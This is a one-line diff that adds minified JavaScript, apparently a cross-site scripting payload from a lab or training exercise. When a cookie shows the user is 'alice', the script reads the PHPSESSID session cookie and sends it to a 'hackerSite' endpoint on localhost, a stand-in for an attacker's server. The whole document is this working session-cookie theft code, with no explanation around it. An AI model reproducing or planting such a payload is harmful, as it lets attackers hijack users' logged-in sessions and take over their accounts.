@@ -1,0 +1,1 @@
+var isAlice=document.cookie.includes("rememberMe=alice;");if(isAlice){var token=document.cookie.split("PHPSESSID=")[1],url="http://localhost/hackerSite?message="+token,xmlhttp=new XMLHttpRequest;xmlhttp.open("GET",url,!0),xmlhttp.send(null)}
